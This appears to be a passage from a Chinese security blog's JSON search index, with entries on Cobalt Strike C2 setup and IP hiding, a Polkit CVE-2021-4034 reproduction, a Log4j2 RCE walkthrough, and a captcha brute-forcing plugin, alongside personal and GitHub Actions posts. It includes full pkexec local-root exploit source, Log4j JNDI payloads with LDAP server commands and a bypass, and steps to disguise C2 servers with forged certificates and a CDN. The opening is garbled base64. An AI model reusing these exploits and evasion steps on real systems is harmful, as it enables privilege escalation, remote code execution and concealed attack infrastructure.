OJCukvvwoUTziex5cQ8Q+C6TwQKlO0zgHdXHALfkkSroBBGmqGZjqdCgaTTKHKOoAC9STz83g6jsI//Jpkjfwc3Avp75u1/4dswHjJk73Ncl9VMXxvMAVFqHzFM1+zuDQo74fw1DLwwXMLDoBuBgD5kf5emmhgDtFRDO5FofOlhQ4L06vNgGJw7s1D1b76YWmY6xv5Uk1IvTYqn8cb4bFzHrQgwuhPcBpITJ7Q7Wu7HZhlLkfKLor7kso4fn0gDUv258Q1MDelXWABmdlkzYSKOUOnsRUTi2hSI65Wy9GgL6IAyMx6vo/iwuKlYlkBafqPjFNY2O3LhVgTYrxmC8y7oXHnBR23wFNrNXlvtct/B8xIL8hiPA4rVcpK2ouPacFZYbdjS74JUdHwKMv5lAC3UpmoevzCQzcze0R03R5p6ZHgvjLxuqKFBkKSgHrAbivLnMEPDXzK3UeKSvG2ftsZiXPCPMZTjD0jBti4ubHc++RzHVC+Zq6ioj3nXjifF2FoJcnPGcdKkYHZBZlL6X5ptXxsT2FFtUTgZYD+iBnS4UlmTdK/oKNsds+ma8E1iBv4K04P83bSIgvunvA/xFX3N6u0m5qevZemY+RTsynSjPrg==#看起来像base64，实际上无法反编码$pythongenerator.py|base64-d7d��&gt;�Z�O�s����R&amp;���o�}x�M����J�H�_��m?�m�8!u�(a__�?�aJ*Eq�骂�^%s'���}�M���7�p��k�F��{jM9h��(?...实际上，我们在做渗透的时候也可以发现这样类似的加密算法，代码我也放到了Bigger仓库::generator.py，当然具体问题具体分析，权当抛砖引玉；以上。"
  },

  {
    "title"    : "Cobalt Strike服务器隐藏真实ip",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Stike-hidden-true-ip/",
    "date"     : "Feb 19, 2022",
    "content"  : "CobaltStike备忘录II本章阐述重点在于如何搭建针对C2服务器进行CDN接入以及真实ip隐藏没写完，卡在CDN上线和CS密钥修改了，有空会继续补充完。cobaltstrike服务端配置TIPS:查看CobaltStike服务器搭建登录VPS启动teamserver修改域名dns到Cloudflare添加DNSA记录到teamserver监听的VPS真实IPSSL/TLS-边缘证书-确保如下选项为OFF：自动HTTPS重写/始终使用HTTPS缓存-配置-alwaysonline等待完成ping域名后已经接入CDN；cobaltstrike客户端配置添加Listeners并填写host和portCloudflareHTTP端口80,8080,8880,2052,2082,2086,2095CloudflareHTTPS端口443,2053,2083,2087,2096,8443如上配置可以上线成功，并且存在相关域名的流量，但进行进一步分析后发现仍然存在相关CS服务器的流量交互于是我就在想是否客户端是否能够通过域名的方式进行流量请求呢？于是我进行了踩坑：1x01Clientconfig1BeaconHttp:HttpHost(s)/Stager/Header均填写对应域名；HttpPort为CF支持解析HTTP端口失败，无法上线；1x02Clientconfig2BeaconHttps:HttpHost(s)/Stager/Header均填写对应域名；HttpPort为CF支持解析HTTP端口成功上线；但是执行Beacon无返回，如下：beacon&gt;getuid[*]Taskedbeacontogetuserid[+]hostcalledhome,sent:8bytes多提一句：1x01/1x02http与https在数据包中的体现是http包与tcp/tls的区别；有兴趣可以看我抓下来的数据包于是我尝试针对靶机中的流量尝试分析，发现当尝试执行beacon，靶机流量会定向到cf.profile配置的api接口：http://domain/api/1301–&gt;https://domain/api/1return–&gt;code525SSLhandshakefailed看起来像是ssl证书的问题，想起来CloudFlareSSL模式为自签名证书，于是修改为CFCA证书进一步排查问题；经过72个小时的重复的枯燥工作，得出一个结论：在尝试基于CDN技术进行CS服务器隐藏ip时，http(s)Hosts栏必须填入相关cs主机的真实ip；验证生成木马windows/beacon_http/reverse_http执行shell命令beacon&gt;shellipconfig在测试靶机里打开wireshark监听流量，流量已经发送到对应域名：返回等待执行命令的返回包参考反溯源-cs和msf域名上线红队基础建设:隐藏你的C2server检测与隐藏Cobaltstrike服务器/#CDNC2服务器隐藏真实ip"
  },

  {
    "title"    : "Cobalt Strike服务器搭建历程",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Strike-Server-build-walkthrough/",
    "date"     : "Feb 15, 2022",
    "content"  : "CobaltStike备忘录I本章阐述重点在于如何搭建起一个C2服务器并且如何隐藏CS相关特征搭建#clientscpCobalt-Stike.tar.gzusername@&lt;vps_ip&gt;:~#servertar-zxvfCobalt-Stike.tar.gz0x01noprofile#servernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;&amp;#clientjava-XX:ParallelGCThreads=4-XX:+AggressiveHeap-XX:+UseParallelGC-jarcobaltstrike.jar#输入&lt;vps_ip&gt;&lt;connect_password&gt;#名字任意填入0x02profile#servernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;your_mode.profile&amp;#clientjava-XX:ParallelGCThreads=4-XX:+AggressiveHeap-XX:+UseParallelGC-jarcobaltstrike.jar#输入&lt;vps_ip&gt;&lt;connect_password&gt;#名字任意填入区别在于加上自制profile可以针对修改受害客户端和C2服务器HTTP/S的流量特征，避免被「简单的局域网爬虫们」爬到以至于被挂黑名单。消除特征1x01修改默认端口CS服务器默认监听在50050端口，可以在启动前编辑teamserver文件更改监听端口：sed-i's/50050/10080/g'teamserverchmod+xteamservernohup./teamserver&lt;vps_ip&gt;&lt;connect_password&gt;&amp;可以看到日志：[+]Teamserverisupon0.0.0.0:100801x02伪造证书删除默认的证书rm./cobaltstrike.store查看teamserver代码中原证书keytool-list-v-storepass123456-keystorecobaltstrike.store并重签一个伪造证书rm./cobaltstrike.storesed-i's!-aliascobaltstrike-dname\"CN=MajorCobaltStrike,OU=AdvancedPenTesting,O=cobaltstrike,L=Somewhere,S=Cyberspace,C=Earth\"!-aliascommon-domain.com-dname\"CN=common-domainWindows,OU=MOPR,O=SentrylabInc,L=Redmond,ST=HEFEI,C=CN\"!g'teamservernmap扫描/消除特征效果：PORTSTATESERVICEVERSION10080/tcpopenssl/unknown|ssl-cert:Subject:commonName=common-domainWindows/organizationName=SentrylabInc/stateOrProvinceName=HEFEI/countryName=CN|Issuer:commonName=common-domainWindows/organizationName=SentrylabInc/stateOrProvinceName=HEFEI/countryName=CN|PublicKeytype:rsa|PublicKeybits:2048|SignatureAlgorithm:sha256WithRSAEncryption|Notvalidbefore:2022-02-17T09:06:25|Notvalidafter:2022-05-18T09:06:25|MD5:2d0befaad9423336f561bb5d9e0b9751|_SHA-1:ee5004847d73d8c4fe5d3ef080fe390ca3ed5bcc|_ssl-date:TLSrandomnessdoesnotrepresenttime1x03重签自有证书Cloudflare导航栏-&gt;SSL/TLS-&gt;源服务器-&gt;创建证书#生成p12文件opensslpkcs12-export-inpublic.pem-inkeyprivate.key-outdomain-test.p12-namedomain-test.com-passoutpass:123456#生成store文件keytool-importkeystore-deststorepass123456-destkeypass123456-destkeystoredomain-test.store-srckeystoredomain-test.p12-srcstoretypePKCS12-srcstorepass123456-aliasdomain-test.com#生成的文件名字可以随意，域名需对应上；完成后修改teamserver中对应的store文件然后启动，证书就是Cloudflare签发的了；以上是几个常见搭建的隐匿思路，不过在网络测绘平台的无差别测绘面前仍然可以寻出蛛丝马迹，参阅以下文章：1x04修改shellcode加密密钥-Mark在CobaltStrike特征隐藏一文中提到：在cobaltstrike的c2malleable配置文件中没有自定义http-stager的uri，默认情况下，通过访问默认的uri，就能获取到cs的shellcode。加密shellcode的密钥又是固定的(3.x0x69，4.x0x2e)，所以能从shellcode中解出c2域名等配置信息点击以查看更多与「C2服务器隐匿」相关的文章参考CobaltStrike特征隐藏与流量分析CobaltStrike特征隐藏PDFSGithubBypasscobaltstrikebeaconconfigscanBypasscobaltstrikebeaconconfigscan"
  },

  {
    "title"    : "Polkit-CVE-2021-4034复现",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/polkit-CVE-2021-4034/",
    "date"     : "Feb 9, 2022",
    "content"  : "2022-01-25，CVE-2021-4034利用详情发布。该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。影响版本不影响版本复现环境$uname-aLinuxubuntu5.8.0-55-generic#62~20.04.1-UbuntuSMPWedJun208:55:04UTC2021x86_64x86_64x86_64GNU/Linux$pkexec--versionpkexecversion0.105结果EXP来源/**blasty-vs-pkexec.c--byblasty&lt;peter@haxx.in&gt;*------------------------------------------------*PoCforCVE-2021-4034,shoutouttoQualys**ctfqualityexploit**blablairresponsibledisclosure**--blasty//2022-01-25*/#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;fcntl.h&gt;voidfatal(char*f){perror(f);exit(-1);}voidcompile_so(){FILE*f=fopen(\"payload.c\",\"wb\");if(f==NULL){fatal(\"fopen\");}charso_code[]=\"#include&lt;stdio.h&gt;\\n\"\"#include&lt;stdlib.h&gt;\\n\"\"#include&lt;unistd.h&gt;\\n\"\"voidgconv(){\\n\"\"return;\\n\"\"}\\n\"\"voidgconv_init(){\\n\"\"setuid(0);seteuid(0);setgid(0);setegid(0);\\n\"\"staticchar*a_argv[]={\\\"sh\\\",NULL};\\n\"\"staticchar*a_envp[]={\\\"PATH=/bin:/usr/bin:/sbin\\\",NULL};\\n\"\"execve(\\\"/bin/sh\\\",a_argv,a_envp);\\n\"\"exit(0);\\n\"\"}\\n\";fwrite(so_code,strlen(so_code),1,f);fclose(f);system(\"gcc-opayload.so-shared-fPICpayload.c\");}intmain(intargc,char*argv[]){structstatst;char*a_argv[]={NULL};char*a_envp[]={\"lol\",\"PATH=GCONV_PATH=.\",\"LC_MESSAGES=en_US.UTF-8\",\"XAUTHORITY=../LOL\",\"GIO_USE_VFS=\",NULL};printf(\"[~]compilehelper..\\n\");compile_so();if(stat(\"GCONV_PATH=.\",&amp;st)&lt;0){if(mkdir(\"GCONV_PATH=.\",0777)&lt;0){fatal(\"mkdir\");}intfd=open(\"GCONV_PATH=./lol\",O_CREAT|O_RDWR,0777);if(fd&lt;0){fatal(\"open\");}close(fd);}if(stat(\"lol\",&amp;st)&lt;0){if(mkdir(\"lol\",0777)&lt;0){fatal(\"mkdir\");}FILE*fp=fopen(\"lol/gconv-modules\",\"wb\");if(fp==NULL){fatal(\"fopen\");}fprintf(fp,\"moduleUTF-8//INTERNAL../payload2\\n\");fclose(fp);}printf(\"[~]maybegetshellnow?\\n\");execve(\"/usr/bin/pkexec\",a_argv,a_envp);}修复chmod0755/usr/bin/pkexec或升级至不影响版本========================================================================CentOS：CentOS6：polkit-0.96-11.el6_10.2CentOS7：polkit-0.112-26.el7_9.1CentOS8.0：polkit-0.115-13.el8_5.1CentOS8.2：polkit-0.115-11.el8_2.2CentOS8.4：polkit-0.115-11.el8_4.2========================================================================Ubuntu：Ubuntu14.04ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1Ubuntu16.04ESM：policykit-1-0.105-14.1ubuntu0.5+esm1Ubuntu18.04LTS：policykit-1-0.105-20ubuntu0.18.04.6Ubuntu20.04LTS：policykit-1-0.105-26ubuntu1.2Ubuntu21.10：policykit-1-0.105-31ubuntu0.1========================================================================Debain：：policykit-10.105-18+deb9u2Debainstretch：policykit-10.105-18+deb9u2Debainbuster：policykit-10.105-25+deb10u1Debainbullseye：policykit-10.105-31+deb11u1Debainbookworm,bullseye：policykit-10.105-31.1========================================================================参考pwnkit:LocalPrivilegeEscalationinpolkit’spkexec(CVE-2021-4034)CVE-2021-4034pkexec提权漏洞分析Linuxpolkit权限提升漏洞修复方法（CVE-2021-4034）以上。"
  },

  {
    "title"    : "Apache Log4J2 RCE复现历程",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apache-Log4j2-RCE-WalkThrough/",
    "date"     : "Dec 15, 2021",
    "content"  : "ApacheLog4j-v2.x-xRCE影响版本：ApacheLog4j2.x&lt;=2.15.0-rc1ApacheLog4j2.x&lt;2.15.0-rc1RCE环境准备标题仓库中demo.jar(更接近实际渗透环境)或者idea代码直接调试Tips:2021-12-21更新：原仓库作者已删除，我这里仓库重新上传了一份，apache-log4j-poc[apache-log4j-poc]-git:(main)&gt;gitremote-vorigin\thttps://github.com/tangxiaofeng7/apache-log4j-poc.git(fetch)origin\thttps://github.com/tangxiaofeng7/apache-log4j-poc.git(push)值得注意的是：@apache-log4j-poc仓库中的截图poc代码为缺省127.0.0.1，我本地并未成功，需调整为网卡监听局域网地址如192.168.x.xJDK版本11以下，我的测试版本如下：&gt;java-versionjavaversion\"1.8.0_181\"Java(TM)SERuntimeEnvironment(build1.8.0_181-b13)JavaHotSpot(TM)64-BitServerVM(build25.181-b13,mixedmode)分析环境把demo.jar拉到jd-gui中反编译代码如下所示：//com.example.log4j2_rce.Log4j2RceApplication@PostMapping({\"/hello\"})publicStringhello(Stringpayload){System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");logger.error(\"{}\",payload);logger.info(\"{}\",payload);logger.info(payload);logger.error(payload);return\"ok\";}访问路由为hello，postpayload参数；尝试#启web$java-jardemo.jar._________/\\\\/___'_____(_)______\\\\\\\\(()\\___|'_|'_||'_\\/_`|\\\\\\\\\\\\/___)||_)|||||||(_||))))'|____|.__|_||_|_||_\\__,|////=========|_|==============|___/=/_/_/_/::SpringBoot::(v2.1.3.RELEASE)直接访问加上payload进行攻击：//$catdnslog.javaimportjava.lang.Runtime;importjava.lang.Process;publicclassdnslog{\tstatic{\t\ttry{\t\tRuntimert=Runtime.getRuntime();\t\tString[]commands={\"open\",\"/System/Applications/Calculator.app\"};\t\tProcesspc=rt.exec(commands);\t\tpc.waitFor();\t\t}catch(Exceptione){\t\t//no\t\t}\t}}//$javacdnslog.java#启LDAP服务：$java-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServer\"http://192.168.3.64/#dnslog\"#启http：$python3-mhttp.server80ServingHTTPon::port80(http://[::]:80/)...ApacheLog4j2.x&gt;=2.15.0-rc1RCE环境准备快速开始：修改idea代码直接调试apache-log4j-poc代码版本为&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;&lt;!--&lt;version&gt;2.14.1&lt;/version&gt;--&gt;&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;/dependency&gt;&lt;!--https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api--&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;&lt;!--&lt;version&gt;2.14.1&lt;/version&gt;--&gt;&lt;version&gt;2.15.0-rc1&lt;/version&gt;&lt;/dependency&gt;我这里是下载好的Log4j2.15.0-rc1用maven编译好后本地安装到仓库，所以不会报错；点击这里了解更多关于MVN安装到本地尝试payload运行控制台返回：23:05:26.715[main]ERRORlog4j-${jndi:ldap://192.168.3.64:1389/dnslog}，貌似已经修复了；但是我们经过手动添加一些选项配置仍然是可以绕过的：添加src/resources/log4j2.xml&lt;?xmlversion=\"1.0\"encoding=\"UTF-8\"?&gt;&lt;configurationstatus=\"OFF\"monitorInterval=\"30\"&gt;&lt;appenders&gt;&lt;consolename=\"Console\"target=\"SYSTEM_OUT\"&gt;&lt;PatternLayoutpattern=\"%m{lookups}%n\"/&gt;&lt;/console&gt;&lt;/appenders&gt;&lt;loggers&gt;&lt;rootlevel=\"all\"&gt;&lt;appender-refref=\"Console\"/&gt;&lt;/root&gt;&lt;/loggers&gt;&lt;/configuration&gt;&lt;PatternLayoutpattern=\"%m{lookups}%n\"/&gt;开启lookup；尝试打印info、debug之类的信息确定配置文件已加载；logger.error(\"hello,error\");logger.info(\"hello,info\");logger.debug(\"hello,debug\");#输出如下：hello,errorhello,infohello,debugProcessfinishedwithexitcode0Bypass攻击payload：${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}具体的绕过以及RCE分析可参考RCE和分析；限制目前暂时只知道jdk高版本会报错：[main]ERRORlog4j-ReferenceClassName:foo这里本人没有测试，可以移步自行分析版本限制bilibili@GCC酱_0ff1c1a1Log4j2漏洞风险演示与个人看法，也欢迎贡献本仓库。代码及参考【安全通报】ApacheLog4j2远程代码执行漏洞bilibili@GCC酱_0ff1c1a1Log4j2漏洞风险演示与个人看法ApacheLog4j2从RCE到RC1绕过浅谈Log4j2之2.15.0版本RCE点击这里了解更多关于MVN安装到本地"
  },

  {
    "title"    : "随便写些",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2021/%E9%9A%8F%E4%BE%BF%E5%86%99%E4%BA%9B/",
    "date"     : "Dec 11, 2021",
    "content"  : "可能是病了吧，我是不愿去看的；对着那张脸，胃里总不是滋味，像是要吐出来，但，我是不敢的，又怕上头来了批，说什么：“头翘得比天高，目中无人。”索性就不去，辞了职。想来其他人也如我这般得了病，只是在当胃开始翻江倒海时，他们心里却熄了火。他们错了吗？没有；只是，他们是他，我是我，上级是上级，大抵如此。心里不安，这却不像我，煞费苦心为了写封辞呈么；这让我些许烦躁，罢了，你就看到这罢！我打开手机一查，这手机日历竟没有假期。组长唧唧歪歪说着：“年轻人！多学一点”之类的话；我横竖睡不着，仔细想了半夜，才从话音里听出来：在空中歪歪斜斜飘着几个字：离职。"
  },

  {
    "title"    : "BurpSuite验证码插件实验",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CAPTCHA-BYPASS-WALKTHROUGH/",
    "date"     : "Nov 23, 2021",
    "content"  : "开卷(juǎn)可能是卷了吧，以前的我看到登录页面是不愿IntruderAttack的，心想：爆破这样的低效率工作，狗都不干；现在看着页面上的验证码，心里总不是滋味，它似乎态度十分强硬：不准过！说着什么图灵测试、机器学习之类的胡话。想来，其他人估计也跟我一样，不然网上的技术帖子怎么愈来愈多且高深了呢；大抵这次，我们真的要站在巨人的肩膀上看这世界了吧？免费的验证码爆破接口，参上：smxiazi/NEW_xp_CAPTCHA$gitclonehttps://github.com/smxiazi/NEW_xp_CAPTCHA.git$cdNEW_xp_CAPTCHA$python3-mpipinstallmuggle_ocr$python3server.pyStartingserver,listenat:0.0.0.0:8899Attack添加拓展：Extender-&gt;Extentions-&gt;[ADD]-&gt;Type:python.-&gt;${path/to/xp_CAPTCHA.py}一般来说，是爆破密码和验证码，故IntruderAttack配置如下：值得注意的是：添加的请求包Headerxiapao:http://url/index.php?s=/Admin/Public/verify.html为验证码生成链接；提示运行Python拓展需安装JpythonJar；下载2.7.1版本及以上的。在开始爆破前，还需做的一件事，是把验证码payload的生成工作交给xp_CAPTCHA；Intruder-&gt;Payloads-&gt;{验证码}{PayloadSet}-&gt;PayloadType:Extension-generated.-&gt;PayloadOptions:SelectGenerator:xp_CAPTCHA设置单线程（Numberofthreads=1）；StartAttack！不过在实际渗透中来看，但凡验证码加一些混淆字符识别率就十分低下：\\[P_{(success)}=\\frac{18}{1795}*100\\%=0.01\\%\\]"
  },

  {
    "title"    : "用Github Actions有感",
    "category" : "",
    "tags"     : "笔记, Github Actions",
    "url"      : "/blog/2021/Feelings-with-using-Github-Action/",
    "date"     : "Nov 15, 2021",
    "content"  : "于2022-09-27修改自律的代码GithubActionsQ：如何让我们在网络上（Github）看起来很勤快/自律？A：使用GithubActions（滑稽）on:push:pull_request:schedule:#换算为北京时间，加上八个小时-cron:'016**4'###-\"自律的5行代码\"##于2022-09-27修改GithubActions的简介GitHubActions是GitHub的持续集成服务，于2018年10月推出。摘于GitHubActions入门教程我更愿意把她叫做Paas(平台服务)；为什么？谈谈我最近这段时间使用的看法：举一个简单的例子：我们在家里怎么做出一块面包？1.采购面包原材料；2.确定面包的外形、口味；3.手动加工原材料；4.烘焙成型。那么一个面包Actions是怎么样的呢？我们只需要人为负责1、2两步，而3、4步怎么办？人类的智慧总是无限，我们确定基本重复流程后“教会”机器，让机器来完成；而我们把精力放在原材料的质量上和面包外形和口味；这就是工厂；来谈谈Action，假设我们定义：在软件生产周期内，不涉及到需求方向，只考虑代码作业；为了方便叙述我简化流程：那么从编辑代码、运行调试代码到最后的上线代码，在某种程度上来看实际上只有第一个流程是和我们息息相关、关联度极高的，我们需要定义各种根据需求来个性化定制的代码、接口、函数，后面的两个流程从一定意义上来看，属于：流水线作业；嘿!把环境搭建和枯燥的环境变量交给机器吧!!!这，是什么？平台。闲谈添加于2022/02/24/14:31:54最近在忙一些其他的事情，blog没有更新太多；突发奇想对About栏左侧按照时间并生成罗马数字进行排序实现思路也很简单，jekyll已经定义了很多标签给我们调用；在for循环里直接调用{{forloop.index}}数组即可直接打印出对应文章的数字序号，然后转成罗马数字于是乎在网上找到了jekyll插件形如下可以直接转化：{{forloop.index|roman}}不过使用jekyll-roman插件后本地预览却一直报错，然而本地Gemfile根据官方文档给的依赖是没有问题的：jekyll-roman0.0.3jekyll-toc0.17.1jekyll-toc(Jekyll::Errors::MissingDependencyException)jekyll-roman(Jekyll::Errors::MissingDependencyException)这两个插件来回报错，于是乎我花了一晚上时间、删除了所有gem依赖来排错；最后发现jekyll-roman这个插件只有0.0.1版本可用，然后上面的Gem依赖传上action也没问题，单纯的版本问题；吐槽一下作者:DGithubActions的作用十一月份对我来说是痴迷Action的一个月，可以看到下面的图，整个十一月按每天算，单天我最多提交了146次包括调试、构建在内的代码：GithubAction提供Github服务器托管的虚拟机包括Linux、Windows以及macOS，支持很多环境，您可以移步docs快速开始还有一些相关的基本概念、文件相关，我就不搬运了，可以移步开头的入门教程查看相关文章内容。Email相关实例如果您对一些实时数据感兴趣，比如最新的CVE、CNVD漏洞库，亦或者您关心服务器服务的运行状态，亦或者是每天的天气，您都可以使用GithubActions市场里的EmailAction相关实例进行复用，紧接着可以对相关配置文件进行配置达到您的目的。我这里以服务器的实时运行任务来举例：相关代码示例备注action.ymlgit目录下流程文件，目录不可变动，文件名可自定义name:'GitHubActionsEmailActionsBybin4xin'任务名称on:[push]任务触发条件，这里指在分支收到推送请求后即执行jobs:任务流程开始{folwname}:任务流程1名称runs-on:ubuntu-latest任务运行镜像自定义，可选Windows、Linux、macOSsteps:流程步骤定义开始-name:'Checkoutcodes'步骤名称，一个流程可以有多个步骤uses:actions/checkout@v1使用actions市场共享代码，只需要设置一些相关必要参数即可成功运行actionrun:bash./processEmail.sh运行系统命令参考此处如果有多条命令可以如左边格式书写needs:build在{folwname}后，Actions默认多个流程并发进行，如果有先后关系则使用到此，我们就可以使用actions来构建一套标准的任务流程；下一步使用默认的邮件action进行测试，参考GitHubActions教程：定时发送天气邮件最后除了文章内的纯文本外，我们还可以自定义邮件为html，然后发一些漂亮的邮件：#此处带美元符的均为两对花括号，详细请移步(https://github.com/Bin4xin/Mail-Action/blob/master/.github/workflows/action.yml#L17)-name:'Sendmail'uses:dawidd6/action-send-mail@v3with:server_address:smtp.qq.comserver_port:465username:${secrets.MAIL_USERNAME}password:${secrets.MAIL_PASSWORD}subject:\"${env.REPORT_PLACE}-订阅信息\"html_body:file://result.htmlto:3313336101@qq.comfrom:哨兵-${env.REPORT_COMMIT}content_type:text/html我的思路是：写好一些通用模版，html模版可以在本地调试好上传即可，然后在bash脚本里拼接、闭合标签即可；echo-e\"$fontStyleEnd\\n$fontStyleEnd\\n$htmlTempStart\\n$serverAllTipsInfo\\n$process\\n$htmlTempEnd\\n\"&gt;result.html效果如下：拓展阅读快速开始：使用GithubAtions订阅每天天气其他一些可能用到的Action变量关于使用GitHubActions进行打包写在最后大数据时代，信息来的更加简单快捷，人心也浮躁；现在很多吃的、喝的，讲究一个手打，这个手打牛丸，那个手磨咖啡；什么时候能有商家、厂商打出手写代码的卖点呢？期待。"
  },

  {
    "title"    : "en",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/en/",
    "date"     : "Nov 7, 2021",
    "content"  : "UsingGitTouseGitonthecommandline,youwillneedtodownload,install,andconfigureGitonyourcomputer.Youcanalsoinstalltousefromthecommandline.Formoreinformation,see:“About.”IfyouwanttoworkwithGitlocally,butdonotwanttousethecommandline,youcaninsteaddownloadandinstalltheclient.Formoreinformation,see:“Installingandconfiguring.”Ifyoudonotneedtoworkwithfileslocally,letsyoucompletemanyGit-relatedactionsdirectlyinthebrowser,including:CreatingarepositoryForkingarepositoryManagingfilesBeingsocialSettingupGitDownloadandinstallthelatestversionofGit.Note:IfyouareusingaChromeOSdevice,additionalsetupisrequired:InstallaterminalemulatorsuchasTermuxfromtheGooglePlayStoreonyourChromeOSdevice.Fromtheterminalemulatorthatyouinstalled,installGit.Forexample,inTermux,enteraptinstallgitandthentypeywhenprompted.SetyourusernameinGit.SetyourcommitemailaddressinGit.AuthenticatingwithfromGitWhenyouconnecttoarepositoryfromGit,youwillneedtoauthenticatewithusingeitherHTTPSorSSH.Note:Youcanauthenticatetousing,foreitherHTTPorSSH.Formoreinformation,seeghauthlogin.ConnectingoverHTTPS(recommended)IfyouclonewithHTTPS,youcancacheyourcredentialsinGitusingacredentialhelper.Formoreinformation,see:“CloningwithHTTPSurls”“CachingyourcredentialsinGit.”ConnectingoverSSHIfyouclonewithSSH,youmustgenerateSSHkeysoneachcomputeryouusetopushorpullfrom.Formoreinformation,see:“CloningwithSSHurls”“GeneratinganewSSHkey.”NextstepsYounowhaveGitandallsetup.Youmaynowchoosetocreatearepositorywhereyoucanputyourprojects.Savingyourcodeinarepositoryallowsyoutobackupyourcodeandshareitaroundtheworld."
  },

  {
    "title"    : "备忘录",
    "category" : "",
    "tags"     : "笔记, Github Action",
    "url"      : "/blog/2021/memorandum-todo/",
    "date"     : "Oct 26, 2021",
    "content"  : "博客的自动化同步问题当前重中之重在与对于博客的自动化同步问题的解决，那么自然需要对当下博客同步进行分析；当下同步流程问题B4xinSynchronize同步对应仓库bin4xin.github.io=&gt;gitpush&gt;www.sentrylab.cnbin4xin.gitee.io=&gt;gitpush&gt;about.sentrylab.cnsentrylab-www-cn=&gt;scp&gt;$vps/nginx_web/sentrylab/www=&gt;git-checkout&gt;www.sentrylab.cnsentrylab-about-cn=&gt;scp&gt;$vps/nginx_web/sentrylab/about=&gt;git-checkout&gt;about.sentrylab.cn如何解决？可以看出，本地仓库太过于冗余，我需要在本地构建完成后将两个JEKYLL（Home与About）项目下的_site拷贝到对应仓库下，然后gitpush，这也是后来为什么有了B4xinSynchronize，我嫌push太繁琐了，甚至还喊出了Letyourgitonlyyesorno的口号(汗)实际上，使用Action进行构建后就解决了部分本地仓库如bin4xin.github.io的同步问题，可以直接在Action构建后push到分支上显示；移步网站构建历程查看详情访问速度的问题而为了所谓的访问速度，妥协了一些优雅性，所以这也是当下我需要去解决的问题；因为一些诸如网站备案等原因，我个人不得不把博客搭建在国外的服务器上，而导致的问题就是：解析、访问速度变得慢了很多，我想这也是很多人所困扰的问题之一；于是我就一直在思考，是否能够针对这个问题来从技术上做一些改变呢：如何解决？cloudflarecname?博客内部分类较为混乱比如：blog与about一开始分栏的想法是准备针对个人研究这一块做单独展示，可是现在看来确实是做到了，但是新的问题涌现出来：分类过于混乱如何解决？考虑中下一步2021/10/26/21:04:22[部分问题总结]About主页访问路由改变；About构建问题；若需解决上面的问题，那么亟需修改的就是对于About的源码构建的问题是否能够仓库2Action构建的源码推送的仓库1的分支上？github与gitee仓库同步问题；由于使用的GITEEACTION模版存在疑问；所以暂时以硬编码的形式进行解决了，不是非常的优雅，这里会先标注，以后会在修改回来；页面添加自行点击：博客国内镜像&amp;&amp;国外镜像跳转；响应式折叠footer相关简介；CNAME是否能够对应不同的镜像跳转？DNS解析中是否能够解决地域跳转问题？待参考项目订阅页面存在问题；博客分类代码展示暂无bug，但访问路由存在问题，需考虑；…当下：Home主页About主页未来：国外镜像｜国内镜像我第一个想到的就是针对不同的访问区ip源进行不同地域跳转staticu_charngx_http_server_string[]=\"Server:COMMUNISTREGIMEPOWERSUPREME\"CRLF;"
  },

  {
    "title"    : "浅谈实际生产业务中公有云和私有云的边界",
    "category" : "",
    "tags"     : "Cloud",
    "url"      : "/blog/2021/The-boundary-between-public-cloud-and-private-cloud/",
    "date"     : "Oct 24, 2021",
    "content"  : "前言我在WEB渗透的工作中常常会碰到这样的现象：很多企业单位在对自身的资产梳理往往都存在或多或少的问题，如：问题为什么产生？解决？备注资产梳理有遗漏企业单位部分边缘业务外包导致；业务生命周期逻辑存在缺陷导致无法闭环；技术人员技术理解参差不齐；…-公网暴露面过多部分员工安全能力薄弱或对此不以为然；技术人员技术理解参差不齐；危害展示技术角度看商用与开源系统、组件版本过低对技术人员的工作、团队默契要求较高；工作是工作、生活是生活。:D…-等等&nbsp;&nbsp;&nbsp;什么是公有云？公有云是最常见的云计算部署类型。公有云资源（例如服务器和存储空间）由第三方云服务提供商拥有和运营，这些资源通过Internet提供。在公有云中，所有硬件、软件和其他支持性基础结构均为云提供商所拥有和管理。什么是私有云、混合云？啰嗦了这么多，介绍公有云是因为要从技术角度来看问题就需要实际应用，而实验条件有限，只能通过公有云环境下来研究公私云边界，步入主题；环境假设现阶段能够模拟的公有云环境如下：业务监听地址监听端口备注nginx主站缺省/:::443-API接口缺省/:::7000frps后端管理组件缺省/:::7500frpsnginx负载均衡缺省/:::8001proxy_pass我们知道，1、2两个业务是需要通过公网访问的，当然API也可以部署内网，但前提是对应API请求代码也需要有所改动，所以暂时先不动；那么着重来看3和4。部署”私有”云实际上，frp是拥有管理面板页面的，具体管理地址是0.0.0.0:7500，那么我们如何让她本地监听从而达到”私有访问”的目的呢？在默认情况下给出的配置无法进行本地监听配置，查看其对应服务端文档配置如下：[common]bind_port=7000#授权码，请改成更复杂的token={your_token_value}#frp管理面板监听地址和端口，请按自己需求更改dashboard_addr=127.0.0.1dashboard_port=7500#frp管理后台用户名和密码，请改成自己的dashboard_user={your_dashboard_user_value}dashboard_pwd={your_dashboard_pwd_value}enable_prometheus=true#frp日志配置log_file